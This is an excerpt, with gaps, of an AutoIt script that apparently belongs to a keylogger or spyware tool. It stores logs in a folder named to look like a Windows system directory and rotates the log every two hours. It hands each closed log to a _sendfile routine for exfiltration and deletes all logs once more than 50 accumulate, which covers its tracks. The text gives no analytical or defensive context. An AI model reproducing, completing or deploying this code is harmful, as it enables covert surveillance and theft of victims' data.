...
Global $file, $f3 = 0
Global $sFldr3 = "C:\WinDOS\Microsoft\Windows\Systems\"
If DirGetSize($sFldr3) = -1 Then
       DirCreate($sFldr3)
    EndIf
Global $Date1=@mon&@mday&@year&"_"&@hour&@min&@sec
Global $file = FileOpen($sFldr3 & $Date1&"log.txt", 1)
Global $check=True
Global $date=@year&@mon&@mday
;MsgBox(0,"Hello",@ScriptName & @CRLF & @ScriptFullPath)
;FileCopy($dir,$sFldr3)
...
Func _Main()
	...
	While 1
	  Local  $now= _NowCalc()
	  Local  $timeSecond=_DateDiff('s', "2017/10/18 00:00:00",$now)
	  Local $t=Mod($timeSecond,7200)
   if $t <10 And $check=True Then
	   Global $check=False
	   Local $d= $Date1
	  FileClose($file)
	  Global $Date1=@mon&@mday&@year&"_"&@hour&@min&@sec
	  Global $file = FileOpen($sFldr3 & $Date1&"log.txt", 1)
	  _sendfile($d,$sFldr3 & $d&"log.txt")
	  Local $array = DirGetSize($sFldr3,1)
		If $array[1] >50 Then
		 FileClose($file)
		 FileDelete($sFldr3 & "*.txt")
		 Global $Date1=@mon&@mday&@year&"_"&@hour&@min&@sec
		 Global $file = FileOpen($sFldr3 & $Date1&"log.txt", 1)
	  EndIf
   EndIf
   if $t >=10 And $check=False Then
	  $check=True;
   EndIf
		Sleep(10)
	WEnd
